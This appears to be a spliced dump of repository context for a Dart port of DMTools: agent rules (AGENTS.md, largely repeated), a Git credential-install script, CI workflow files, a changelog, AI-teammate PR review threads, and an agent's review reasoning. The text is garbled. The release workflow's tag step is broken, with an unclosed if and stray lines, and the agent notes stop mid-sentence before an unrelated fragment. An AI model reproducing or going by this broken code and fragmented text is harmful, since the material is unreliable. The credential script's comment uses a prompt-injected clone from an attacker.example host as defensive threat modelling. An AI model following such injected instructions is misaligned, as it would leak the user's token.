| `crap4dart.yaml` | Quality gate config (threshold 8.0, sources lib/bin/test) |
| `.github/workflows/quality.yml` | CI: format → analyze → test+coverage → crap4dart |
| `bin/dmtools.dart` | CLI entry (stub; full JobRunner surface = Phase 2) |

## 3. Local dev loop

```bash
export PATH="$HOME/.pub-cache/bin:$PATH"   # crap4dart lives here; without it the
                                           # pre-commit hook SKIPS checks silently

dart pub get
make native                               # build the QuickJS .so (quickjs_runtime pkg)
dart format .                              # CI fails on unformatted code
dart analyze
dart test --coverage=coverage
dart pub global run coverage:format_coverage \
  --lcov --in coverage --out coverage/lcov.info --report-on lib
crap4dart check --all                      # gates (fast, no network)
crap4dart analyze                          # CRAP scores, threshold 8.0
```

If crap4dart is missing: `dart pub global activate crap4dart`.

## 4. Commit & CI discipline

- Small, focused commits; message states *what* and *why* (and the Java file that
  served as spec, when porting behavior).
- The hook runs only on staged files — CI runs everything, so run the full local
  loop above before pushing.
- CI red = stop and fix; no merging on red.
- `git commit --no-verify` is a code smell; if you use it, say why in the message.

## 5. Current status & next work

**All 5 phases implemented.** 387 canonical MCP tools across 17 integrations
(no dmtools-agents tool call remains uncovered; the Java↔Dart gap snapshot in
`test/fixtures/java_mcp_tool_gaps.txt` tracks the remaining non-agent names).
QuickJS runtime via dart:ffi with sync callbacks — dmtools-agents suite passes
unmodified (751 tests green). CliAgent lifecycle fully
ported (incl. timer/error/line JS actions). `dmtools run`, `list`, `doctor`,
`--version`, `--help`, `--list-jobs` all functional.

**Sync dispatch** (`executeToolViaJava`): `SyncToolDispatcher` routes by
prefix to self-contained per-integration classes in `lib/src/js/sync_tools/`
(jira, github, gitlab, ado, confluence, bitrise, jenkins) plus per-provider
`<provider>_ai_chat` — HTTP via curl subprocess inside NativeCallable
callbacks, `file_*`/`cli_*` via `SyncToolDispatcher.nonHttpHandler`. The
JS bridge (`JobJavaScriptBridge` parity): CommonJS `require` loader
(`require_loader.dart`), JSRunner context (`ticket`/`response`/`initiator`/
`inputJql`/`metadata`), inline/URL/file jsPath, action() contract, JS-visible
host-fn validation errors (`__jsError` sentinel), alias tool wrappers.

**Remaining work** (diminishing returns, in priority order):
1. InstructionProcessor
2. Integration test layer (L2 contract tests, L3 live integration)
3. Re-extract `test/fixtures/java_mcp_tool_names.txt` when Java gains new
   @MCPTools and port what the gap snapshot then reports

Phase checkboxes live in GOAL.md — tick them as you complete items and keep the
file current when a decision changes the plan.

## 6. Testing layers (so you put each test in the right place)

| Layer | Location | Runs where |
|---|---|---|
| L1 unit | `test/`, mocked | pre-commit + CI quality.yml |
| L2 contract | `test/` with recorded Java fixtures | CI quality.yml |
| L3 live integration | `test/` `@Tags(['integration'])`, creds via env/`dmtools.env` | nightly + manual, excluded by default via `dart_test.yaml` |
| L4 agents suite | external `agents/js/unit-tests/run_all.json` | dedicated CI job from Phase 4 |

The agents suite (`dmtools run agents/js/unit-tests/run_all.json` under the Dart
runtime, unmodified) is the **primary acceptance gate** — see GOAL.md.

## 7. Style notes

- `dart format` defaults; public API documented (public_docs gate enforces it).
- Keep methods small (complexity ≤ 10, body ≤ 60 lines, params ≤ 6 — the gates
  enforce this; design around it rather than fighting it).
- Generated code (`*.g.dart`, `*.freezed.dart`) is gate-excluded by default —
  don't hand-edit, regenerate.

## 8. fa session reuse (CI machine)

The ai-teammate machine resumes one fa session per ticket instead of starting
cold on every run. Sessions are named deterministically per `repo:GH-<n>:group` —
bug/story/rework share the `dev-write` conversation (a rework continues the
ticket's dev thread), review has its own `dev-review`. The session directory
(`.dmtools/fa-sessions`) travels across CI runs on a dedicated per-issue branch
`fa-sess/gh-<n>`: restored before the run, force-pushed after it, never merged.
For live debugging, `FA_LOG_FILE` (`fa --log-file`) captures the full
untruncated agent transcript, uploaded as the `fa-trace-*` run artifact;
dmtools also streams the agent's output live into the step log via stderr
mirroring (gh-50). Wiring: `.github/workflows/ai-teammate.yml`.

blocks.text:
#!/usr/bin/env bash
# install-source-git-credentials.sh — make SOURCE_GITHUB_TOKEN the credential
# that wins for github.com pushes, instead of the checkout's GitHub App token
# (github-actions[bot]). gh-63: bot-actor pushes put every machine PR behind
# the "workflows awaiting approval" gate and cannot touch .github/workflows.
#
# Shared by EVERY push path in a run (the "Configure Git Author + push
# credentials" step and the memory-persist re-assert) so the logic exists
# exactly once (review: the inline copies drifted / had to be fixed 6x).
# Idempotent — safe to call again later in the same job.
#
# Callers must export SOURCE_GITHUB_TOKEN; GITHUB_WORKSPACE
# come from the Actions environment (sane fallbacks below).
#
# What it does, in order:
#   1. Purge the checkout's persisted App token:
#        - actions/checkout (verified against the shipped v4.2.2 and v5.0.0
#          dist) writes http.https://github.com/.extraheader DIRECTLY into
#          the repo's local .git/config (configureToken → local config,
#          globalConfig = false). It never writes any RUNNER_TEMP include
#          file — an earlier version of this script claimed so and removed
#          a matching temp-file glob, a silent no-op that chased a file
#          that does not exist (PR #68 review thread 7). `git config
#          --unset-all` on the local config is what actually purges the
#          main repo.
#        - with submodules: true, checkout ALSO writes the real token
#          extraheader into EACH submodule's local config
#          (.git/modules/<name>/config) — a `git submodule foreach
#          --recursive` purge follows, or any push from inside agents/
#          still authenticates as github-actions[bot] (thread 8).
#        - belt-and-braces: the global config too (older checkout versions
#          persisted the extraheader globally).
#   2. Install the credential that must win, HOST-SCOPED to github.com:
#        a generic `credential.helper` is consulted for ANY https host whose
#        server answers 401 — a prompt-injected `git clone
#        https://attacker.example/repo.git` would receive the
#        workflows-capable PAT. The helper is therefore registered on
#        `credential.https://github.com.helper` (only consulted for matching
#        URLs) and ALSO re-checks the host from its stdin before answering.
#        Both inherited helper lists (generic + github.com-scoped) are reset
#        first, so this checkout is immune to anything that adds helpers
#        later (e.g. a mid-run `gh auth setup-git`, runner-image config).
#        Each invocation is logged to .dmtools/credential-helper.log with a
#        CRED_HELPER_CONTEXT tag — the at-push-time proof of which
#        credential served the push (trace dry-runs tag themselves
#        `trace-dry-run` so they cannot inflate the push evidence).
#   3. Best-effort: attribute commits to the SOURCE account (its noreply
#      email). The PUSH actor is what matters for the approval gate; dm.ai
#      stays the fallback when the lookup fails.
set -euo pipefail

# Fallback commit identity — overridden below when the SOURCE account resolves.
git config --global user.name "dm.ai"
git config --global user.email "dm.ai@epam.com"

if [ -z "${SOURCE_GITHUB_TOKEN:-}" ]; then
  echo "::warning::SOURCE_GITHUB_TOKEN not set — no push credential installed. The checkout no longer persists its App token (persist-credentials: false, gh-63), so pushes FAIL instead of silently authenticating as github-actions[bot] and landing behind the bot-actor approval gate"
  exit 0
fi

blocks.text:
# Machine merge bot stub — event-driven fast path (factory pack).
#
# The SM cron tick is best-effort (GitHub silently drops scheduled runs);
# this workflow reacts to EVENTS: CI conclusion, label changes, head
# pushes, check-run completions — and runs the deterministic mergeBot
# (factory-merge.yml) so approved green PRs merge within seconds.
# Idempotent against the SM: shared labels, first actor wins.
name: 'Machine Merge Bot'

on:
  workflow_run:
    workflows: ['Quality']   # the dispatched CI — rename per repo if needed
    types: [completed]
  pull_request:
    types: [labeled, synchronize, edited]
  check_run:
    types: [completed]
  workflow_dispatch: {}

permissions:
  contents: read
  pull-requests: write
  issues: write

concurrency:
  group: machine-merge-bot
  cancel-in-progress: false

jobs:
  merge:
    # Label events only matter for the machine latches; other PR events
    # (synchronize/edited) always run — cheap and idempotent.
    if: >-
      github.event_name != 'pull_request' ||
      github.event.action != 'labeled' ||
      contains(github.event.label.name, 'ai_') ||
      contains(github.event.label.name, 'pr_approved')
    uses: IstiN/dmtools-agents/.github/workflows/factory-merge.yml@6b953f80e7670c20e5a354a350946eaf24287dda
    with:
      factory_ref: 6b953f80e7670c20e5a354a350946eaf24287dda
      # Bitrise Build Hub pool (epam-org visible; probe #229).
      runner: bitrise-runner-dmtools-ci
      ci_workflow: quality.yml
    secrets:
      SOURCE_GITHUB_TOKEN: ${{ secrets.SOURCE_GITHUB_TOKEN }}

# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Changed

- Retired the legacy `machine-kit` layer (gh-146): the machine loop runs on
  the factory pack (reusable `agents/.github/workflows/factory/teammate.yml`
  + `sm.yml` behind the thin `.github/workflows/ai-teammate.yml` and
  `machine-sm.yml` stubs). Deleted `machine-kit/teammate-install/`
=== quality.yml on: ===
name: Quality

# Dispatch-only CI (2026-09 machine-loop redesign): pushes fire NO CI —
# the SM (machine-sm.yml → factory-sm) is the only trigger. It dispatches
# this workflow on the PR head when validation is due (sm rule
# validate-fresh / validate-armed), so intermediate dev/rework pushes and
# silent branch updates are free. Required checks still match: the
# dispatched run registers its check runs on the head SHA.
# Main keeps its push CI (badges + history).
on:
  workflow_dispatch: {}

concurrency:
  # PR branches: a fresh dispatch supersedes the in-flight run. Main keeps
  # every run (badges + history).
  group: quality-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

_Previous review discussions for PR #265._

## Review Threads (Inline Comments)

### Thread 1 — `.github/workflows/machine-merge.yml`

**ai-teammate** (2026-09-26):
⚠️ **IMPORTANT: `machine-merge.yml` pin bump is not covered by the factory-stub lockstep guard**

This PR correctly completes #260's pin bump (`6a7544c` → `6b953f8`) in all three stubs, but the lockstep guard that exists precisely to prevent partial pin bumps — `test/machine_kit/factory_stub_ref_test.dart` — still only maps two stubs:

```dart
const _stubs = {
  '.github/workflows/ai-teammate.yml': '.github/workflows/factory-teammate.yml',
  '.github/workflows/machine-sm.yml': '.github/workflows/factory-sm.yml',
};
```

`machine-merge.yml` has the identical `uses:`/`factory_ref`/`secrets` contract (verified: its pin already equals the submodule SHA, `factory_ref` matches `uses:`, and it maps exactly the secret set `factory-merge.yml` declares — `SOURCE_GITHUB_TOKEN`), so adding the third entry would pass today:

```dart
'.github/workflows/machine-merge.yml': '.github/workflows/factory-merge.yml',
```

Without it, the next partial bump can silently leave `machine-merge.yml` on a stale factory commit — exactly the drift class gh-261/#260 just paid for. Since the line this PR touches is the pin itself, the guard hole deserves closing in the same change.

---

### Thread 2 — `.github/workflows/release-cli.yml`

**ai-teammate** (2026-09-26):
💡 **SUGGESTION: `stamp_required_checks` has no failure handling — one transient API error kills the release**

The helper runs `gh api` three times with no retry and no explicit error message; the step runs under GitHub's implied `bash -e`, so the first failed `gh api` (rate limit, 5xx, flaky network) aborts the whole "Push commit and tag" step — after the temp-branch force-push — with only the raw gh error for diagnosis, and the run needs a manual re-dispatch.

`gh` has built-in retry support, so this is a one-word hardening per call:

```bash
gh api --retry 2 -X POST "repos/${{ github.repository }}/check-runs" \
  -f name="$ctx" \
  ...
```

or, for a stamp-specific failure message, an explicit guard:

```bash
gh api ... >/dev/null || { echo "::error::failed to stamp required check '$ctx' on $sha"; exit 1; }
```

Pre-existing behavior (the old inline loop was identical), so not merge-blocking — but this is the exact code being reworked for failure semantics.

---

### Thread 3 — `.github/workflows/release-cli.yml`

**ai-teammate** (2026-09-26):
💡 **SUGGESTION: decline-guard error message presumes the cause is stamp drift**

The new guard is a real improvement over the old "main moved" lie, but the message asserts a specific diagnosis for *any* GH006 decline:

```
rejected by branch protection — the stamp_required_checks set has drifted
from the required contexts; ...
```

A protection decline can also mean: a fourth required context was added, "require branches up to date" is enabled (a rebase would actually be the right response), or required-review settings changed. When that happens, the message would send the next debugger down the wrong path — the same misdiagnosis bug this PR fixes, just with a different suspect.

Suggest wording that names the mechanism, not the presumed cause:

```
echo "::error::push to ${{ github.ref_name }} rejected by branch protection (GH006) — compare the required contexts in branch protection settings with the 'for ctx in' set in .github/workflows/release-cli.yml (stamp drift is the usual cause; gh-261)"
```

---

### Thread 4 — `test/release_required_checks_test.dart`

**ai-teammate** (2026-09-26):
💡 **SUGGESTION: guard-test assertions are looser than the invariants they document**

Two precision nits in the new guards (the file is new, so both are fixable now):

1. `RegExp(r'for ctx in (.+?); do').firstMatch(workflow)` validates only the *first* `for ctx in` occurrence in the file. If a second such loop is ever added earlier in the workflow (the build job has several `for attempt` loops that could be copy-pasted into this shape), the test silently validates the wrong loop and passes on a drifted stamp set.

2. `'stamp_required_checks'.allMatches(workflow).length >= 3` counts occurrences but proves no ordering: the documented invariant is "defined, invoked before the first push, and re-invoked after the rebase", yet a workflow where the pre-loop call was removed and a second call added inside the loop would still count 3 and pass — while the first push would go out unstamped.

Suggested tightening:

```dart
final lines = workflow.split('\n');
final stampLoopIdx =
    lines.indexWhere((l) => l.contains('for ctx in static gate agents-suite'));
final tempPushIdx =
    lines.indexWhere((l) => l.contains('release-temp-v'));
final firstStampIdx = lines
    .indexWhere((l) => l.trim() == 'stamp_required_checks');
expect(firstStampIdx, greaterThan(tempPushIdx),
    reason: 'the first stamp must follow the temp-branch push ...');
expect(firstStampIdx, lessThan(<index of the for attempt loop>),
    reason: '... and precede the first push attempt');
```

The regex pin on the full literal `for ctx in static gate agents-suite` also makes the exact-set test robust against an earlier second loop.

---

### Thread 5 — `.github/workflows/release-cli.yml`

**ai-teammate** (2026-09-26):
💡 **SUGGESTION: the `[skip ci]` comment's premise is now stale (quality.yml is dispatch-only)**

The renamed comment still says a push of the release SHA "would otherwise trigger the real static / gate / agents-suite suites". Since the machine-loop redesign, `quality.yml` triggers only on `workflow_dispatch` (the SM dispatches it; pushes fire no CI), so a push to `release-temp-*` or main triggers no real suites to race with the API-stamped ones. `[skip ci]` remains harmless belt-and-braces, but the explanation of *why* it is load-bearing no longer holds and could mislead the next person debugging a release failure (they might wait for real runs that can never start).

Suggested rewording, e.g.:

```

# is the only trigger), but if a push-triggered workflow returns, this
# prevents the release SHA from racing the API-stamped success check-runs
# (live: release-cli failure at v0.1.17 attempt 1).
```

Comment-only; behavior is unchanged and correct either way.

**ai-teammate** (2026-09-26):

blocks.text:
name: Release CLI

# dm.ai-style release flow: press the button (workflow_dispatch), everything
# else is automatic. A custom version may be passed; leaving it empty
# auto-increments the patch version from pubspec.yaml.
#
#   1. version-and-tag: bump pubspec.yaml + lib/src/version.dart, commit,
#      tag vX.Y.Z, push, generate the changelog since the previous tag
#   2. build: standalone dmtools binaries (AOT via `dart compile exe`) for
#      every supported platform, smoke-tested on their builders
#   3. release: publish tar.gz bundles + install.sh + checksums with the
#      generated changelog as the release body
#
# Trigger is dispatch-only (like dm.ai) — the workflow itself pushes the tag,
# so a tag-push trigger would double-fire.
#
# Platform matrix: linux-x64/arm64, macos-x64/arm64, windows-x64
# (MinGW-w64 builds the QuickJS bridge; the zip carries dmtools.exe +
# the bridge + a dmtools.cmd launcher that pins JSR_QUICKJS_LIB).

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Custom version (e.g. 0.2.0). Leave empty to auto-increment patch.'
        required: false
        type: string

permissions:
  contents: write
  checks: write # required-check creation for the release commit (dm.ai pattern)

jobs:
  version-and-tag:
    name: version and tag
    runs-on: bitrise-runner-dmtools-ci
    timeout-minutes: 10
    outputs:
      version: ${{ steps.new_version.outputs.version }}
      changelog: ${{ steps.changelog.outputs.body }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0 # tags + history for the changelog

      - name: Configure Git
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

      - name: Read current version
        id: current_version
        run: |
          CURRENT_VERSION=$(grep '^version:' pubspec.yaml | cut -d' ' -f2 | tr -d '"' )
          echo "current=$CURRENT_VERSION" >> "$GITHUB_OUTPUT"
          echo "Current version: $CURRENT_VERSION"

      - name: Determine new version
        id: new_version
        run: |
          CURRENT_VERSION="${{ steps.current_version.outputs.current }}"
          CUSTOM_VERSION="${{ github.event.inputs.version }}"

          if [ -n "$CUSTOM_VERSION" ]; then
            NEW_VERSION="$CUSTOM_VERSION"
            case "$NEW_VERSION" in v*) NEW_VERSION="${NEW_VERSION#v}" ;; esac
            echo "Using custom version: $NEW_VERSION"
          else
            # Auto-increment patch version (dm.ai release.yml parity)
            MAJOR="$(echo "$CURRENT_VERSION" | cut -d. -f1)"
            MINOR="$(echo "$CURRENT_VERSION" | cut -d. -f2)"
            PATCH="$(echo "$CURRENT_VERSION" | cut -d. -f3)"
            NEW_VERSION="$MAJOR.$MINOR.$((PATCH + 1))"
            echo "Auto-incremented version: $NEW_VERSION"
          fi

          echo "version=$NEW_VERSION" >> "$GITHUB_OUTPUT"

      - name: Update version files
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          sed -i.bak "s/^version:.*/version: $NEW_VERSION/" pubspec.yaml
          sed -i.bak "s/dmtoolsVersion = '[^']*'/dmtoolsVersion = '$NEW_VERSION'/" \
            lib/src/version.dart
          rm -f pubspec.yaml.bak lib/src/version.dart.bak
          grep '^version:' pubspec.yaml
          grep "dmtoolsVersion = '" lib/src/version.dart

      - name: Commit version change
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          git add pubspec.yaml lib/src/version.dart
          # Tolerate the already-bumped tree: the version bump usually goes
          # through a PR (protected main rejects GITHUB_TOKEN pushes), so a
          # re-run dispatch finds the files already at NEW_VERSION. The tag
          # and build below are what matter then.
          # [skip ci] is load-bearing: the temp-branch force-push (and the
          # eventual main push) would otherwise trigger the real static /
          # gate / agents-suite suites on the release SHA — branch
          # protection then sees them in_progress alongside the API-created
          # success runs and rejects the push ("3 of 3 required status
          # checks have not succeeded"; live: release-cli failure at
          # v0.1.17 attempt 1).
          git commit -m "chore: bump version to $NEW_VERSION [skip ci]" \
            || echo "version already at $NEW_VERSION — nothing to commit"

      - name: Create tag
        id: tag
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          # Re-dispatch with an already-released version is a no-op, not a
          # failure (manual rerun of the release button, run 34721850825):
          # `git tag` would die on "tag already exists" and paint the run
          # red for what is effectively "already shipped".
          if git rev-parse -q --verify "refs/tags/v$NEW_VERSION" >/dev/null; then
            echo "::warning::v$NEW_VERSION already released — skipping tag/build/publish"

          CURRENT_VERSION="${{ steps.current_version.outputs.current }}"
          NEW_VERSION="${{ steps.new_version.outputs.version }}"

            echo ""
            if git rev-parse "v$CURRENT_VERSION" >/dev/null 2>&1; then
              git log --format='- %s (%h)' "v$CURRENT_VERSION"..HEAD

          SOURCE_GITHUB_TOKEN: ${{ secrets.SOURCE_GITHUB_TOKEN }}
          GH_TOKEN: ${{ github.token }} # gh api check-run creation

          bash machine-kit/scripts/install-source-git-credentials.sh

blocks.text:
# AGENTS.md — rules for working in dmtools-dart

Pure Dart port of DMTools (Java/GraalJS → Dart/QuickJS). **Read `GOAL.md` first —
it is the spec.** This file is the operating manual: rules, commands, layout.

---

## 1. Non-negotiable rules

1. **crap4dart is law.** CRAP threshold **8.0** (`crap4dart.yaml`), tool
   pinned to **0.9.5** in CI (and locally; keep both in sync). Pre-commit hook
   runs `crap4dart check --staged`; CI runs `check --all` + `analyze` on every push.
   Never commit on red, never weaken a gate to make code pass. Known
   exemptions live in `crap4dart.yaml` with comments (Java-parity client
   classes → class_size warning; testrail_create_case* Java-parity
   @MCPParam signatures → method_size max_params override).
2. **Signature parity with Java DMTools.** Config JSON keys, tool names
   (snake_case), env variables, CLI commands — identical to the Java version.
   A config or `dmtools.env` that works with Java must work unchanged here.
   When behavior is ambiguous, **the Java source is the spec**; record the decision
   in the commit message.
3. **No JVM, no GraalVM.** Dart only. JS runtime is QuickJS via `dart:ffi` with
   synchronous host calls (not the `flutter_js` plugin), consumed from the
   **`quickjs_runtime` package** (github.com/IstiN/quickjs_runtime, git dep in
   `pubspec.yaml`) — never vendored here. Build the native library with
   `make native` (or `bash "$QUICKJS_PKG/tool/build_quickjs.sh"`); the .so is
   built inside the package checkout and found via
   `.dart_tool/package_config.json` (override with `JSR_QUICKJS_LIB`).
4. **Thin `bin/`.** CI coverage is collected with `--report-on lib`, so `bin/` is
   outside LCOV. All logic lives in `lib/`; `bin/` only parses argv and delegates.
5. **Tests ship with code.** Coverage gate is 80% (`gates.test_coverage`).
   Test code is held to the same bar (`sources: [lib, bin, test]`).
6. **Never commit secrets.** `dmtools.env` / `dmtools-local.env` are git-ignored;
   keep them that way. Credentials in tests come only from the standard config
   resolution chain (see GOAL.md → Integration testing strategy).

## 2. Where things are

| Path | What |
|---|---|
| `GOAL.md` | **The spec**: mission, constraints, audit facts, phases 0–5, test strategy |
| `crap4dart.yaml` | Quality gate config (threshold 8.0, sources lib/bin/test) |
| `.github/workflows/quality.yml` | CI: format → analyze → test+coverage → crap4dart |
| `bin/dmtools.dart` | CLI entry (stub; full JobRunner surface = Phase 2) |
| `install.sh` | One-line installer: prebuilt AOT binaries from GitHub Releases (see `release-cli.yml` / `install-test.yml`) |
| `lib/` | All implementation code |
| `test/` | `dart test` suite (L1 unit; L2 contract fixtures later) |

Java reference implementation (read-only, the spec for behavior):
**https://github.com/epam/dm.ai** — clone it fresh (always the latest upstream);
key files are named per phase in GOAL.md (e.g. `PropertyReader.java`,
`JobRunner.java`, `JobJavaScriptBridge.java`, `cliagent/CliAgent.java`).
Agent scripts and the JS test suite: **https://github.com/IstiN/dmtools-agents**.
JS runtime (`jsr`) extensions go to **https://github.com/IstiN/flutter_js_widget_runtime**
via fork + PR — never vendored here (see GOAL.md).

## 3. Local dev loop

```bash
export PATH="$HOME/.pub-cache/bin:$PATH"   # crap4dart lives here; without it the
                                           # pre-commit hook SKIPS checks silently

dart pub get
make native                               # build the QuickJS .so (quickjs_runtime pkg)
dart format .                              # CI fails on unformatted code
dart analyze
dart test --coverage=coverage
dart pub global run coverage:format_coverage \
  --lcov --in coverage --out coverage/lcov.info --report-on lib
crap4dart check --all                      # gates (fast, no network)
crap4dart analyze                          # CRAP scores, threshold 8.0
```

If crap4dart is missing: `dart pub global activate crap4dart`.

## 4. Commit & CI discipline

- Small, focused commits; message states *what* and *why* (and the Java file that
  served as spec, when porting behavior).
- The hook runs only on staged files — CI runs everything, so run the full local
  loop above before pushing.
- CI red = stop and fix; no merging on red.
- `git commit --no-verify` is a code smell; if you use it, say why in the message.

## 5. Current status & next work

**All 5 phases implemented.** 387 canonical MCP tools across 17 integrations
(no dmtools-agents tool call remains uncovered; the Java↔Dart gap snapshot in
`test/fixtures/java_mcp_tool_gaps.txt` tracks the remaining non-agent names).
QuickJS runtime via dart:ffi with sync callbacks — dmtools-agents suite passes
unmodified (751 tests green). CliAgent lifecycle fully
ported (incl. timer/error/line JS actions). `dmtools run`, `list`, `doctor`,
`--version`, `--help`, `--list-jobs` all functional.

**Sync dispatch** (`executeToolViaJava`): `SyncToolDispatcher` routes by
prefix to self-contained per-integration classes in `lib/src/js/sync_tools/`
(jira, github, gitlab, ado, confluence, bitrise, jenkins) plus per-provider
`<provider>_ai_chat` — HTTP via curl subprocess inside NativeCallable
callbacks, `file_*`/`cli_*` via `SyncToolDispatcher.nonHttpHandler`. The
JS bridge (`JobJavaScriptBridge` parity): CommonJS `require` loader
(`require_loader.dart`), JSRunner context (`ticket`/`response`/`initiator`/
`inputJql`/`metadata`), inline/URL/file jsPath, action() contract, JS-visible
host-fn validation errors (`__jsError` sentinel), alias tool wrappers.

**Remaining work** (diminishing returns, in priority order):
1. InstructionProcessor
2. Integration test layer (L2 contract tests, L3 live integration)
3. Re-extract `test/fixtures/java_mcp_tool_names.txt` when Java gains new
   @MCPTools and port what the gap snapshot then reports

Phase checkboxes live in GOAL.md — tick them as you complete items and keep the
file current when a decision changes the plan.

## 6. Testing layers (so you put each test in the right place)

| Layer | Location | Runs where |
|---|---|---|
| L1 unit | `test/`, mocked | pre-commit + CI quality.yml |
| L2 contract | `test/` with recorded Java fixtures | CI quality.yml |
| L3 live integration | `test/` `@Tags(['integration'])`, creds via env/`dmtools.env` | nightly + manual, excluded by default via `dart_test.yaml` |
| L4 agents suite | external `agents/js/unit-tests/run_all.json` | dedicated CI job from Phase 4 |

The agents suite (`dmtools run agents/js/unit-tests/run_all.json` under the Dart
runtime, unmodified) is the **primary acceptance gate** — see GOAL.md.

## 7. Style notes

- `dart format` defaults; public API documented (public_docs gate enforces it).
- Keep methods small (complexity ≤ 10, body ≤ 60 lines, params ≤ 6 — the gates
  enforce this; design around it rather than fighting it).
- Generated code (`*.g.dart`, `*.freezed.dart`) is gate-excluded by default —
  don't hand-edit, regenerate.

## 8. fa session reuse (CI machine)

The ai-teammate machine resumes one fa session per ticket instead of starting
cold on every run. Sessions are named deterministically per `repo:GH-<n>:group` —
bug/story/rework share the `dev-write` conversation (a rework continues the
ticket's dev thread), review has its own `dev-review`. The session directory
(`.dmtools/fa-sessions`) travels across CI runs on a dedicated per-issue branch
`fa-sess/gh-<n>`: restored before the run, force-pushed after it, never merged.
For live debugging, `FA_LOG_FILE` (`fa --log-file`) captures the full
untruncated agent transcript, uploaded as the `fa-trace-*` run artifact;
dmtools also streams the agent's output live into the step log via stderr
mirroring (gh-50). Wiring: `.github/workflows/ai-teammate.yml`.

blocks.text:
Confirmed: on main, the agents submodule is at 6b953f8 but the three stub workflows still pin 6a7544c — so `factory_stub_ref_test` was red on main (test expects `uses:` ref == submodule SHA). This PR completes the bump. Good — this is in scope as described.

Now let me check the CI status. The instructions mention `ci_failures.md` and `ci_failures_full.log` and `pr_discussions.md` — but those files don't exist input/gh-261/. Only pr_info.md, pr_diff.txt, ticket.md, ticket.json exist. So no CI failures to report.

Let me now review the key logic in the release-cli.yml push step carefully:

1. `stamp_required_checks()` — defines a bash function that stamps 3 check-runs via `gh api -X POST repos/.../check-runs` with `GH_TOKEN: ${{ github.token }}`. The workflow has `permissions: checks: write` — good, github.token can create check-runs.

2. Note: the function stamps check runs on `git rev-parse HEAD` at call time. First call is after the temp-branch force-push. Then in the retry loop, after rebase, `stamp_required_checks` is called again — good fix for the rebase creates new SHA issue.

3. Potential issue: **`gh api` failure handling**. The `stamp_required_checks` function doesn't check gh api exit codes. If a check-run creation fails (e.g., rate limit, transient 5xx, token permission issue), the function returns non-zero... actually wait, the last command in the loop determines the function's return status. If the LAST gh api call succeeds but an earlier one fails, the function returns 0 (success). Actually, `for` loop's exit status is that of the last command executed. So a partial stamp failure on `static` and `gate` but success on `agents-suite` → function returns 0 → push proceeds → protection declines → but now the new guard aborts with "stamp set has drifted" — misleading message since the real cause could be a transient API failure. Also: with `set -e` behavior in GH Actions run steps (bash default is `bash -e`), any gh api failure inside the function would exit the step immediately... Actually GitHub Actions runs `bash --noprofile --norc -e -o pipefail` by default. With `-e`, a failing `gh api` inside the function would terminate the step (since the function body's commands are part of the main execution context... wait, `-e` applies within function bodies too — the failing command causes the shell to exit unless it's in a condition context). So under `-e`, a transient `gh api` failure would kill the whole push step with no retry — the run goes red, requiring a full re-dispatch. That's a robustness concern: no retry on stamping. Since the temp branch push happened, a re-dispatch would... re-run dispatch finds version already bumped, tag not created (push failed before tag), so it re-commits (no-op) and re-pushes — recoverable. Minor robustness issue → SUGGESTION/IMPORTANT.

Actually, wait — is it worth flagging? The old code had the same behavior (no error handling on gh api). The new code just moved it into a function. So it's pre-existing, but the diff touches this exact code. The retry loop retry logic improvements are new. A stamp failure mid-function under `-e` → whole step dies with a raw gh api error message — at least visible. Not blocking.

4. **Bigger correctness issue**: the decline-guard grep for `protected branch hook declined`. Git's actual output on GH006 is:

```
remote: error: GH006: Protected branch update failed for refs/heads/main.
```

And the classic message is `! [remote rejected] HEAD -> main (protected branch hook declined)`. Yes — git prints `(protected branch hook declined)` as the reason in the `remote rejected` line. That's accurate.

But: what if the decline reason is different, e.g., "required status checks have not succeeded"? GitHub's push rejection with GH006 typically still goes through the pre-receive hook and git reports "protected branch hook declined" regardless of the specific GH error code printed in `remote:` lines. So grep for 'protected branch hook declined' catches all GH006 cases. Good.

However — the `::error::` message says "the stamp_required_checks set has drifted from the required contexts" — but a protection decline can have other causes (e.g., a new required check added, admin forced review, etc.). The message presumes drift. Minor wording issue — but the message does say "see .github/workflows/release-cli.yml and test/...". Not a real problem; could mention "e.g." but that's polish. Actually, wait — there's a subtle issue: the decline aborts the whole push including the tag push. Before, tag push `git push origin "v$NEW_VERSION"` happened after main push. On a protection decline (drifted stamp set), the fix requires code change; tag won't land. That's correct behavior.

5. **Race/deadlock consideration**: `stamp_required_checks` is called AFTER the temp-branch force-push. But check-runs are attached to a SHA, not a branch, so ordering doesn't matter much. OK.

6. **The `[skip ci]` comment** says the temp-branch force-push "and the eventual main push would otherwise trigger the real static/gate/agents-suite suites" — note: pushing to `release-temp-*` branch would trigger quality.yml if quality.yml triggers on push to any branch? Let me check quality.yml's `on:` to verify. Also whether push protection `on: push: branches: [main]`. Not critical.

7. **Potential real issue — rebase re-stamp but commit message check-runs**: after rebase, `git rebase origin/main` — the version bump commit is reapplied creating a NEW SHA. `stamp_required_checks` uses `git rev-parse HEAD` — new SHA. Good.

But wait — there's a subtle problem with the rebase in this workflow: the workflow checks out `main` (dispatch on main). `git rebase origin/main` rebases the version-bump commit onto origin/main. OK.

8. **`attempt 3` check ordering**: `[ "$attempt" -eq 3 ] && { ... exit 1; }` — under `set -e`, `[ "$attempt" -eq 3 ]` evaluating false on attempts 1-2... A bare `[ ... ] && { ... }` as a compound statement: if the test fails, the whole statement returns non-zero (status of `[`), and with `-e` the shell would exit! Wait, no: commands in `&&`/`||` lists are exempt from `set -e` except the last command in the list. Actually the rule: "The shell does not exit if the command that fails is part of the command list immediately following a while or until keyword, part of the test following the if or elif reserved words, part of any command executed in a && or || list except the command following the final && or ||". In `A && B`, if A fails, the exit status of the whole list is A's status (non-zero) — and the list itself is a command; set -e... The exemption says commands in a && list except the final one are exempt. A is not the final command, so A failing doesn't trigger exit. And B never runs. The list's overall status is non-zero, but does the list's non-zero status trigger -e? #!/usr/bin/env bash
# install-source-git-credentials.sh — make SOURCE_GITHUB_TOKEN the credential
# that wins for github.com pushes, instead of the checkout's GitHub App token
